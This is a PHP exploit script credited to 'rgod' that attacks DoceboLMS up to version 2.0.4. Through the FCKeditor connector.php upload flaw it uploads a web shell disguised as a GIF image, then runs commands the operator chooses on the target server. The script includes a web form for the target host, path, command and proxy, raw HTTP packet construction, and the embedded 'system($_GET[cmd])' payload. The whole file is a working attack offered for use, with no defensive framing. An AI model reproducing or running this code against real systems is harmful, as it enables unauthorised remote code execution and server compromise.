<?php
#  ---docebo_204_xpl.php                              15.38 04/12/2005         #
#                                                                              #
#  DoceboLMS AKA SpaghettiLearning<= 2.0.4 connector.php Shell Upload          #
#                              coded by rgod                                   #
#                    site: http://rgod.altervista.org                          #
#                                                                              #
#  usage: launch from Apache, fill in requested fields, then go!               #
#                                                                              #
#  Sun-Tzu: "This is called, using the conquered foe to augment                #
#  one's own strength."                                                        #

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);

echo'<html><head><title>***** DoceboLMS <= 2.0.4 connector.php Shell Upload ****
</title><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style type="text/css"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--></style></head><body><p class="Stile6">
***** DoceboLMS <= 2.0.4 connector.php Shell Upload ****</p><p class="Stile6">a
script  by  rgod  at        <a href="http://rgod.altervista.org"target="_blank">
http://rgod.altervista.org</a></p><table width="84%"><tr><td width="43%">  <form
name="form1" method="post"  action="'.strip_tags($SERVER[PHP_SELF]).'"><p><input
type="text"  name="host"> <span class="Stile5">* hostname (ex:www.sitename.com)
</span></p> <p><input type="text" name="path">  <span class="Stile5">* path (ex:
/docebo/ or just / ) </span></p><p><input type="text" name="command">     <span
class="Stile5">*specify a command</span> </p><p> <input type="text" name="port">
<span class="Stile5">specify  a  port   other than  80 ( default  value )</span>
</p><p><input  type="text"   name="proxy"><span class="Stile5">  send    exploit
through an  HTTP proxy (ip:port)</span></p><p><input type="submit" name="Submit"
 value="go!"></p></form> </td></tr></table></body></html>';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".$headeri[$li+$ki]."</td>";
			    }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".$headeri[$li]."</td>";
			    }
echo "</tr></table>";
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //if you have sockets module loaded, 2x speed! if not,load
		              //next function to send packets
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket < 0) {
                   echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
                   }
	      else
 		  {   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
                    echo "OK.<br>";
                    echo "Attempting to connect to ".$host." on port ".$port."...<br>";
                    if ($proxy=='')
		   {
		     $result = socket_connect($socket, $host, $port);
		   }
		   else
		   {

		   $parts =explode(':',$proxy);
                   echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
		   $result = socket_connect($socket, $parts[0],$parts[1]);
		   }
		   if ($result < 0) {
                                     echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
                                    }
	                       else
		                    {
                                     echo "OK.<br><br>";
                                     $html= '';
                                     socket_write($socket, $packet, strlen($packet));
                                     echo "Reading response:<br>";
                                     while ($out= socket_read($socket, 2048)) {$html.=$out;}
                                     echo nl2br(htmlentities($html));
                                     echo "Closing socket...";
                                     socket_close($socket);

				    }
                  }
}
function sendpacketii($packet)
{
global $proxy, $host, $port, $html, $proxy_regex;
if ($proxy=='')
      {$ock=fsockopen(gethostbyname($host),$port);
       if (!$ock) { echo 'No response from '.htmlentities($host);
			die; }
      }
             else
           {
	   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
	   $parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $ock=fsockopen($parts[0],$parts[1]);
	    if (!$ock) { echo 'No response from proxy...';
			die;
		       }
	   }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo nl2br(htmlentities($html));
}
$host=$_POST[host];$path=$_POST[path];
$port=$_POST[port];$command=$_POST[command];
$proxy=$_POST[proxy];

if (($host<>'') and ($path<>'') and ($command<>''))
{
$port=intval(trim($port));
if ($port=='') {$port=80;}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
$host=str_replace("\r\n","",$host);
$path=str_replace("\r\n","",$path);

$SHELL=
chr(0x47).chr(0x49).chr(0x46).chr(0x38).chr(0x39).chr(0x61).
chr(0x01).chr(0x00).chr(0x01).chr(0x00).chr(0xf7).chr(0x00).
chr(0x00).chr(0xa4).chr(0xb6).chr(0xa4).chr(0x16).chr(0x00).
chr(0x00).chr(0xf4).chr(0x00).chr(0x00).chr(0x77).chr(0x00).
chr(0x00).chr(0x6b).chr(0x00).chr(0x4c).chr(0x15).chr(0x00).
chr(0x00).chr(0xf4).chr(0x00).chr(0x69).chr(0x77).chr(0x00).
chr(0x00).chr(0xf8).chr(0x00).chr(0x6e).chr(0x62).chr(0x00).
chr(0x00).chr(0x15).chr(0x00).chr(0x67).chr(0x00).chr(0x00).
chr(0x00).chr(0x34).chr(0x00).chr(0x75).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x61).chr(0xc0).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x89).chr(0x00).chr(0x00).chr(0x1c).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0xa9).chr(0x00).chr(0x00).chr(0x20).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x6f).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x56).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).
"<?php ini_set(\"max_execution_time\",0);error_reporting(0);
system(\$_GET[cmd]);?>"
.chr(0x38).chr(0x00).chr(0x00).chr(0xe5).chr(0x00).
chr(0x00).chr(0x12).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x98).chr(0x01).chr(0x00).
chr(0xcc).chr(0x00).chr(0x00).chr(0x15).chr(0x00).chr(0x00).
chr(0x00).chr(0x58).chr(0x00).chr(0x10).chr(0xe6).chr(0x00).
chr(0x04).chr(0x12).chr(0x00).chr(0x10).chr(0x00).chr(0x00).
chr(0x04).chr(0x05).chr(0x00).chr(0x01).chr(0x90).chr(0x00).
chr(0x00).chr(0xf6).chr(0x00).chr(0x00).chr(0x77).chr(0x00).
chr(0x00).chr(0xc8).chr(0x00).chr(0x10).chr(0xd5).chr(0x00).
chr(0xe8).chr(0xf5).chr(0x00).chr(0x12).chr(0x77).chr(0x00).
chr(0x00).chr(0xff).chr(0x00).chr(0x13).chr(0xff).chr(0x00).
chr(0x6c).chr(0xff).chr(0x00).chr(0x6c).chr(0xff).chr(0x00).
chr(0x74).chr(0x6a).chr(0x00).chr(0x03).chr(0x16).chr(0x00).
chr(0x00).chr(0xf4).chr(0x00).chr(0x00).chr(0x77).chr(0x00).
chr(0x00).chr(0xc4).chr(0x00).chr(0x30).chr(0x1e).chr(0x00).
chr(0x75).chr(0xe5).chr(0x00).chr(0x15).chr(0x77).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x15).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0xdc).chr(0x00).chr(0x00).
chr(0xe7).chr(0x00).chr(0x00).chr(0x12).chr(0x00).chr(0x00).
chr(0x00).chr(0x70).chr(0x00).chr(0x01).chr(0x59).chr(0x00).
chr(0x00).chr(0x18).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x04).chr(0x00).chr(0x88).chr(0x01).chr(0x00).
chr(0xe8).chr(0x05).chr(0x00).chr(0x12).chr(0x01).chr(0x00).
chr(0x00).chr(0x6c).chr(0x00).chr(0x04).chr(0xe3).chr(0x00).
chr(0x42).chr(0x12).chr(0x00).chr(0x6e).chr(0x00).chr(0x00).
chr(0x74).chr(0x7e).chr(0x00).chr(0x30).chr(0x00).chr(0x00).
chr(0x87).chr(0x00).chr(0x00).chr(0x6e).chr(0xc0).chr(0x00).
chr(0x74).chr(0x00).chr(0x00).chr(0xff).chr(0x00).chr(0x00).
chr(0xff).chr(0x00).chr(0x00).chr(0xff).chr(0x00).chr(0x00).
chr(0xff).chr(0xff).chr(0x00).chr(0xd6).chr(0xff).chr(0x00).
chr(0x32).chr(0xff).chr(0x00).chr(0x6e).chr(0xff).chr(0x00).
chr(0x74).chr(0xff).chr(0x00).chr(0x6c).chr(0xff).chr(0x00).
chr(0x5b).chr(0xff).chr(0x00).chr(0xe5).chr(0xff).chr(0x00).
chr(0x77).chr(0x00).chr(0x00).chr(0x53).chr(0x00).chr(0x00).
chr(0x15).chr(0x00).chr(0x00).chr(0x53).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x07).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x6b).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x58).chr(0x00).chr(0x00).chr(0x03).chr(0x00).
chr(0xf0).chr(0x00).chr(0x00).chr(0x15).chr(0x00).chr(0x00).
chr(0x00).chr(0x06).chr(0x00).chr(0x00).chr(0xf6).chr(0x00).
chr(0x00).chr(0xe4).chr(0x00).chr(0x00).chr(0x77).chr(0x00).
chr(0x00).chr(0x0f).chr(0x00).chr(0x00).chr(0x1e).chr(0x00).
chr(0x00).chr(0xe5).chr(0x00).chr(0x00).chr(0x77).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x01).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0xf8).chr(0x74).chr(0x00).chr(0x62).chr(0xe7).
chr(0x00).chr(0x01).chr(0x12).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0xc8).chr(0x68).chr(0x00).chr(0x28).
chr(0x32).chr(0x15).chr(0xe5).chr(0xe6).chr(0x00).chr(0x77).
chr(0x77).chr(0xa4).chr(0x00).chr(0xff).chr(0xe5).chr(0x00).
chr(0xff).chr(0x12).chr(0x00).chr(0xff).chr(0x00).chr(0x00).
chr(0xff).chr(0x00).chr(0x00).chr(0x6c).chr(0x00).chr(0x00).
chr(0x5b).chr(0x00).chr(0x00).chr(0xe5).chr(0x00).chr(0x00).
chr(0x77).chr(0xfc).chr(0xf8).chr(0x36).chr(0xf7).chr(0x62).
chr(0x00).chr(0x12).chr(0x15).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x05).chr(0x00).chr(0x36).chr(0x90).chr(0x01).
chr(0x00).chr(0xf6).chr(0x00).chr(0x00).chr(0x77).chr(0x00).
chr(0x00).chr(0xc8).chr(0x04).chr(0xd8).chr(0xd5).chr(0x29).
chr(0xed).chr(0xf5).chr(0xe5).chr(0x12).chr(0x77).chr(0x77).
chr(0x00).chr(0xff).chr(0x94).chr(0xff).chr(0xff).chr(0xe7).
chr(0xff).chr(0xff).chr(0x12).chr(0xff).chr(0xff).chr(0x00).
chr(0xff).chr(0x6a).chr(0x64).chr(0x00).chr(0x16).chr(0x2f).
chr(0x00).chr(0xf4).chr(0xe6).chr(0x00).chr(0x77).chr(0x77).
chr(0x00).chr(0xe0).chr(0x00).chr(0x9c).chr(0x18).chr(0x00).
chr(0xe8).chr(0xe5).chr(0x00).chr(0x12).chr(0x77).chr(0x00).
chr(0x00).chr(0x00).chr(0xff).chr(0x4e).chr(0x00).chr(0xff).
chr(0x21).chr(0x15).chr(0xff).chr(0x4c).chr(0x00).chr(0xff).
chr(0x00).chr(0x00).chr(0x6f).chr(0x7c).chr(0x00).chr(0x10).
chr(0xe8).chr(0x00).chr(0xe5).chr(0x12).chr(0x00).chr(0x77).
chr(0x00).chr(0xf8).chr(0x00).chr(0x7b).chr(0x62).chr(0x00).
chr(0xe0).chr(0x15).chr(0x00).chr(0x4e).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x98).chr(0xb0).chr(0x01).chr(0xe8).
chr(0xe8).chr(0x00).chr(0x12).chr(0x12).chr(0x00).chr(0x00).
chr(0x00).chr(0x64).chr(0x98).chr(0x6f).chr(0x2f).chr(0x10).
chr(0x10).chr(0xe6).chr(0xe5).chr(0xe5).chr(0x77).chr(0x77).
chr(0x77).chr(0x00).chr(0x10).chr(0x52).chr(0x00).chr(0xe4).
chr(0xe9).chr(0x00).chr(0x4e).chr(0x12).chr(0x00).chr(0x00).
chr(0x00).chr(0x61).chr(0x20).chr(0xc8).chr(0x00).chr(0x02).
chr(0xff).chr(0x6c).chr(0x4f).chr(0xff).chr(0x00).chr(0x00).
chr(0x7f).chr(0x69).chr(0x00).chr(0x1c).chr(0x00).chr(0x01).
chr(0xe9).chr(0x61).chr(0x00).chr(0x12).chr(0x00).chr(0x00).
chr(0x00).chr(0x29).chr(0x94).chr(0x00).chr(0x00).chr(0xe7).
chr(0x00).chr(0x00).chr(0x12).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x6f).chr(0x00).chr(0x01).
chr(0x10).chr(0x00).chr(0x00).chr(0xe5).chr(0x00).chr(0x00).
chr(0x77).chr(0x00).chr(0xa0).chr(0x00).chr(0x00).chr(0x3a).
chr(0x00).chr(0x00).chr(0x50).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x01).chr(0x00).chr(0x30).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x69).
chr(0x00).chr(0x00).chr(0x61).chr(0x60).chr(0x00).chr(0x74).
chr(0xf1).chr(0x00).chr(0x74).chr(0x15).chr(0x00).chr(0x69).
chr(0x00).chr(0x00).chr(0x00).chr(0xf0).chr(0x00).chr(0x00).
chr(0xaa).chr(0x00).chr(0x02).chr(0x47).chr(0x00).chr(0x00).
chr(0x00).chr(0x21).chr(0xf9).chr(0x04).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x2c).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x01).chr(0x00).chr(0x01).chr(0x00).
chr(0x07).chr(0x08).chr(0x04).chr(0x00).chr(0x01).chr(0x04).
chr(0x04).chr(0x00).chr(0x3b).chr(0x00);

$data='-----------------------------7d529a1d23092a
Content-Disposition: form-data; name="NewFile"; filename="C:\class.php"
Content-Type:

'.$SHELL.'
-----------------------------7d529a1d23092a--
';

$packet="POST ".$p."addons/fckeditor2rc2/editor/filemanager/browser/default/connectors/php/";
$packet.="connector.php?Command=FileUpload&Type=&CurrentFolder= HTTP/1.1\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
show($packet);
sendpacketii($packet);

$dirs= array ( '', 'fileCourses/UserFiles/' );

for ($i=0; $i<=count($dirs)-1; $i++)
{
$packet="GET ".$p.$dirs[$i]."class.php?cmd=".urlencode($command)." HTTP/1.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
show($packet);
sendpacketii($packet);
if (eregi('200 OK',$html)) {echo "Exploit succeeded..."; die;}
}
//if you are here...
echo "Exploit failed...";
}
else
{echo "Fill * required fields, optionally specify a proxy...";}
?>
